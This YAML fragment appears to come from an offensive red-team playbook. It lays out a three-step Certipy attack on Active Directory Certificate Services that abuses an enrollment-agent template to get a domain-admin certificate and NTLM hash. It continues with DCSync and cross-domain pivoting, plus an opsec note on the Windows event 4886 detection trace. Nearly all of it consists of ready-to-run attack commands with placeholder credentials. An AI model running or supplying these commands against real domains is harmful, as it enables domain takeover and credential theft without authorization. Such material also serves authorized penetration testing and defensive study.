    commands:
      - label: "Step 1 — Get enrollment agent certificate"
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template '{TEMPLATE}'"
      - label: "Step 2 — Use enrollment agent cert to request cert as DA"
        cmd: "certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -ca '{CA_NAME}' -target {CA_IP} -template 'User' -on-behalf-of '{DOMAIN}\\{TARGET_USER}' -pfx {USERNAME}.pfx"
      - label: "Step 3 — Authenticate with DA certificate"
        cmd: "certipy auth -pfx {TARGET_USER}.pfx -dc-ip {DC_IP}"
    next:
      - Use recovered DA NTLM hash for DCSync
      - Pivot to cross-domain using acquired hash
    opsec: >
      Multiple certificate events (4886). The on-behalf-of request is unusual
